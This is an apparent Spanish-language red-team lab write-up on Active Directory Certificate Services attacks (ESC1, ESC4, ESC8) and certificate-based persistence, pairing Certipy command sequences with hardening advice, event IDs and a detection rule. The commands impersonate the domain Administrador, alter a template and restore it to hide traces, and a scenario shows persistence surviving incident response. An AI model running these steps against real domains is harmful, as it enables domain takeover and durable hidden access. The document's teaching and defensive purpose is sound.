# Tradecraft — Operación DARK GATE
## Lab-03: Active Directory Certificate Services (ADCS) Attacks

**Operación:** DARK GATE | **Adversario:** APT29 | **Nivel:** Fundamentals  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [PKI y ADCS — Infraestructura de clave pública en AD](#1-pki-y-adcs)
2. [Certificados en Kerberos — PKINIT](#2-certificados-en-kerberos)
3. [ESC1 — Subject Alternative Name abuse](#3-esc1)
4. [ESC4 — Template modification](#4-esc4)
5. [ESC8 — NTLM Relay to ADCS (identificado)](#5-esc8)
6. [Persistencia via certificados — Por qué es tan peligrosa](#6-persistencia-via-certificados)
7. [Certipy — La herramienta definitiva para ADCS](#7-certipy)
8. [Defensa y detección de ataques ADCS](#8-defensa-y-detección)

---

## 1. PKI y ADCS — Infraestructura de clave pública en AD

### ¿Qué es ADCS?

Active Directory Certificate Services es el componente de Microsoft que implementa una **PKI (Public Key Infrastructure)** integrada con AD. Permite emitir, gestionar y revocar certificados digitales para usuarios, equipos y servicios dentro del dominio.

### Componentes de ADCS

**CA (Certificate Authority)**
La autoridad que firma y emite certificados. En AD hay:
- **Enterprise CA**: integrada con AD, puede usar plantillas de certificado y emitir automáticamente
- **Standalone CA**: no integrada con AD, requiere aprobación manual

**Certificate Templates**
Plantillas que definen las propiedades de los certificados que puede emitir la CA:
- Para qué se puede usar el certificado (autenticación, firma, cifrado)
- Quién puede solicitarlo
- Si se permite especificar el Subject Alternative Name (SAN)
- Si requiere aprobación del CA Manager

**Certificate Store**
Donde se almacenan los certificados en Windows: `certmgr.msc` para usuarios, `certlm.msc` para la máquina local.

### Por qué ADCS es un target valioso

1. **Persistencia durable** — un certificado de autenticación es válido durante años, independientemente de cambios de contraseña
2. **Movimiento lateral** — los certificados permiten autenticación Kerberos sin contraseña
3. **Escalada de privilegios** — plantillas mal configuradas permiten obtener certificados como cualquier usuario
4. **Difícil de detectar** — el uso de certificados genera eventos diferentes a la autenticación por contraseña

---

## 2. Certificados en Kerberos — PKINIT

### ¿Qué es PKINIT?

PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) es una extensión de Kerberos que permite autenticarse usando un certificado en lugar de una contraseña.

### Flujo de autenticación PKINIT

```
1. Cliente → KDC: AS-REQ con certificado (firma digital del pre-auth data)
2. KDC verifica el certificado contra la CA del dominio
3. KDC → Cliente: AS-REP con TGT
4. Flujo Kerberos normal continúa
```

### Por qué un certificado es más poderoso que una contraseña

- **No expira con la contraseña** — cambiar la contraseña no invalida el certificado
- **Válido durante años** — típicamente 1-2 años por defecto
- **Puede usarse offline** — no requiere contactar la CA para autenticarse
- **Difícil de revocar** — requiere acceso a la CA y los sistemas actualizados de CRL

### NT Hash desde un certificado

Certipy puede usar PKINIT para obtener el hash NT de una cuenta:

```
Certificado de usuario → PKINIT AS-REQ → TGT → NTLM hash via U2U Kerberos
```

Esto permite usar el hash NT con PTH incluso sin conocer la contraseña.

---

## 3. ESC1 — Subject Alternative Name abuse

### La vulnerabilidad

Una plantilla de certificado con ESC1 permite al solicitante especificar un **Subject Alternative Name (SAN)** arbitrario. El SAN puede ser el UPN (User Principal Name) de cualquier usuario del dominio, incluyendo Administrador.

### Condiciones para ESC1

Una plantilla es vulnerable a ESC1 cuando cumple **todas**:

1. **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** — el solicitante puede especificar el SAN
2. **EKU incluye Client Authentication** — el certificado sirve para autenticación
3. **Permisos de enrolamiento** — el usuario actual puede solicitar certificados de esta plantilla

### Flujo del ataque

```
1. Identificar plantilla vulnerable con Certipy
2. Solicitar certificado especificando SAN = Administrador@atackcorp.local
3. La CA emite el certificado con ese SAN sin verificar la identidad
4. Usar el certificado para autenticarse como Administrador via PKINIT
5. Obtener TGT + hash NT de Administrador
```

### Por qué la CA emite el certificado sin verificar

La CA confía en que el solicitante tiene derecho a usar el SAN que especifica. Esta confianza es correcta en muchos casos (un usuario solicitando un certificado para su propio email). El error es permitir esta opción en plantillas de autenticación sin restricciones adicionales.

### Ejemplo con Certipy

```bash
# Encontrar plantillas vulnerables
certipy find -u usuario@dominio -p password -dc-ip IP -vulnerable

# Solicitar certificado como Administrador
certipy req -u usuario@dominio -p password -dc-ip IP \
  -ca CA-NAME -template TEMPLATE-VULNERABLE \
  -upn Administrador@dominio

# Autenticarse con el certificado
certipy auth -pfx Administrador.pfx -dc-ip IP
```

---

## 4. ESC4 — Template modification

### La vulnerabilidad

ESC4 ocurre cuando un usuario tiene permisos de **escritura** sobre una plantilla de certificado. Esto permite modificar la plantilla para que sea vulnerable a ESC1 y luego explotarla.

### Permisos que generan ESC4

| Permiso | Qué permite |
|---------|-------------|
| `WriteProperty` sobre la plantilla | Modificar atributos de la plantilla |
| `GenericWrite` sobre la plantilla | Control total de atributos |
| `GenericAll` sobre la plantilla | Control total incluyendo permisos |
| `WriteOwner` sobre la plantilla | Tomar propiedad y luego control total |

### Flujo del ataque

```
1. Identificar plantilla con permisos de escritura para el usuario actual
2. Modificar la plantilla para añadir CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
3. Solicitar certificado como Administrador (ESC1)
4. Restaurar la plantilla original (OPSEC — cubrir rastros)
5. Autenticarse con el certificado
```

### Por qué restaurar la plantilla

Si se deja la plantilla modificada, los administradores pueden detectar el cambio en auditorías. Restaurar la configuración original minimiza el tiempo de exposición y dificulta la atribución.

### Certipy ESC4

```bash
# Modificar plantilla (ESC4 → ESC1)
certipy template -u usuario@dominio -p password -dc-ip IP \
  -template TEMPLATE-OBJETIVO -save-old

# Solicitar certificado (ahora vulnerable como ESC1)
certipy req -u usuario@dominio -p password -dc-ip IP \
  -ca CA-NAME -template TEMPLATE-OBJETIVO \
  -upn Administrador@dominio

# Restaurar plantilla original
certipy template -u usuario@dominio -p password -dc-ip IP \
  -template TEMPLATE-OBJETIVO -configuration TEMPLATE-OBJETIVO.json
```

---

## 5. ESC8 — NTLM Relay to ADCS

### La vulnerabilidad

El endpoint HTTP de ADCS (`/certsrv/certfnsh.asp`) acepta autenticación NTLM. Si se puede forzar a un Domain Controller a autenticarse via NTLM hacia este endpoint, se puede obtener un certificado en nombre del DC.

### Condiciones para ESC8

1. La CA tiene habilitada la **inscripción web** (`certsrv` accesible via HTTP)
2. Existe una plantilla de certificado para autenticación de **cuentas de máquina**
3. Se puede forzar la autenticación NTLM del DC (PetitPotam, SpoolSample)

### Flujo del ataque

```
1. Arrancar impacket-ntlmrelayx apuntando al endpoint ADCS
2. Forzar autenticación NTLM del DC (PetitPotam)
3. ntlmrelayx intercepta y reenvía la autenticación NTLM al endpoint ADCS
4. ADCS emite un certificado para DC-01$ (la cuenta de máquina del DC)
5. Usar el certificado DC-01$ para PKINIT → TGT del DC → DCSync
```

### Por qué es tan peligroso

No requiere ninguna configuración incorrecta más allá de tener el endpoint HTTP activo. El relay NTLM a ADCS fue descubierto como variante de PetitPotam y es extremadamente difícil de mitigar sin deshabilitar la inscripción web.

### Mitigación

- Deshabilitar inscripción web ADCS o requerir HTTPS + Kerberos
- Activar EPA (Extended Protection for Authentication) en IIS
- Aplicar KB5005413 (parche para PetitPotam)

### Estado en DARK GATE

ESC8 fue **identificado** como vulnerable pero no ejecutado completamente en este lab porque el relaying NTLM en el mismo segmento tiene limitaciones técnicas (no se puede hacer relay de credenciales hacia el mismo host). Se documenta como vector potencial en entornos con la CA en un servidor separado.

---

## 6. Persistencia via certificados — Por qué es tan peligrosa

### El problema de la persistencia tradicional

Los mecanismos de persistencia tradicionales (tareas programadas, claves de registro, servicios) son detectados y eliminados por los equipos de IR (Incident Response) durante la respuesta a incidentes.

El primer paso de IR siempre incluye:
1. Cambiar contraseñas de todas las cuentas privilegiadas
2. Resetear hash de krbtgt (invalida Golden Tickets)
3. Buscar y eliminar tareas programadas, servicios y claves de registro sospechosos

### Por qué los certificados sobreviven a un IR

Un certificado de autenticación válido permite autenticarse aunque:
- **La contraseña haya cambiado** — el certificado es independiente de la contraseña
- **El hash krbtgt haya sido reseteado** — PKINIT no usa krbtgt para la autenticación inicial
- **Las sesiones hayan sido invalidadas** — el certificado siempre puede generar un nuevo TGT

**La única mitigación real es revocar el certificado en la CA** — algo que los equipos de IR frecuentemente no hacen porque no saben que el certificado fue emitido.

### Certificado de Administrador post-IR

```
Escenario:
1. Atacante obtiene certificado como Administrador (ESC1)
2. IR detecta el incidente, cambia todas las contraseñas
3. El certificado sigue siendo válido
4. Atacante usa el certificado para volver a entrar
5. Nuevo TGT como Administrador sin conocer la nueva contraseña
```

Este es un patrón real documentado en operaciones de APT29 — el actor obtiene persistencia via certificados antes de ser detectado.

---

## 7. Certipy — La herramienta definitiva para ADCS

### ¿Qué es Certipy?

Certipy es una herramienta Python de ly4k para ataques y enumeración de ADCS. Automatiza toda la cadena desde la enumeración de plantillas vulnerables hasta la obtención de hashes NT.

### Módulos principales

| Módulo | Función |
|--------|---------|
| `find` | Enumerar CA, plantillas y vulnerabilidades |
| `req` | Solicitar certificados |
| `auth` | Autenticarse con un certificado (PKINIT) |
| `template` | Modificar plantillas de certificado (ESC4) |
| `relay` | Relay NTLM hacia ADCS (ESC8) |
| `shadow` | Shadow Credentials (msDS-KeyCredentialLink) |
| `forge` | Forjar certificados con clave CA comprometida |

### Flujo completo de enumeración

```bash
# 1. Encontrar todas las vulnerabilidades
certipy find -u usuario@dominio -p password -dc-ip IP -vulnerable -stdout

# Output típico:
# [!] ESC1 — Template: VulnerableTemplate
#     CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled
#     Enrollment rights: Domain Users
```

### Interpretación del output

```
Certificate Templates
  Template Name: UserAuthentication
  [!] Vulnerabilities
    ESC1: 'ATACKCORP.LOCAL\\Domain Users' can enroll and template allows
          SAN (msPKI-Certificate-Name-Flag = 0x1)
          Client Authentication EKU present
```

**ESC1 confirmado si:**
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1` en `msPKI-Certificate-Name-Flag`)
- EKU incluye `Client Authentication` (1.3.6.1.5.5.7.3.2) o `Smart Card Logon`
- El usuario actual tiene permisos de `Enroll` o `AutoEnroll`

---

## 8. Defensa y detección de ataques ADCS

### Hardening de ADCS

**1. Auditar plantillas de certificado**
```powershell
# Listar plantillas con CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
certutil -v -template | findstr "msPKI-Certificate-Name-Flag"
```

**2. Deshabilitar SAN en plantillas de autenticación**
- Quitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` de todas las plantillas usadas para autenticación de usuarios

**3. Requerir aprobación del CA Manager**
- Para plantillas sensibles, activar "CA certificate manager approval"

**4. Deshabilitar inscripción web HTTP**
- O habilitar EPA (Extended Protection for Authentication)

**5. Monitorizar certificados emitidos**
- Alertar cuando se emite un certificado con SAN diferente al solicitante
- Alertar cuando se modifica una plantilla de certificado

### Event IDs relevantes

| Event ID | Log | Descripción |
|----------|-----|-------------|
| 4886 | Security (CA) | Certificado emitido |
| 4887 | Security (CA) | Certificado emitido con modificaciones |
| 4899 | Security (CA) | Plantilla de certificado actualizada |
| 4900 | Security (CA) | Permisos de plantilla modificados |

### Regla SIGMA para ESC1

```yaml
title: ADCS Certificate Request with Different SAN
detection:
  selection:
    EventID: 4886
    LogSource: 'Microsoft-Windows-Security-Auditing'
  condition:
    # SAN en el certificado difiere del usuario solicitante
    # Requiere correlación con el solicitante
  falsepositives:
    - Administración legítima de certificados
```

### PKI Health Check

```powershell
# Verificar salud de la CA
certutil -verify -urlfetch CA-CERT.crt

# Listar certificados emitidos recientemente
certutil -view -restrict "NotBefore>=01/01/2026" -out "RequesterName,SubjectAltName,NotAfter"
```

---

## Referencias

- [SpecterOps — Certified Pre-Owned (whitepaper original)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
- [Microsoft ADCS Documentation](https://docs.microsoft.com/en-us/windows-server/networking/core-network-guide/cncg/server-certs/install-the-certification-authority)
- [KB5005413 — Mitigating NTLM Relay Attacks on ADCS](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)

---

*Operación DARK GATE — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*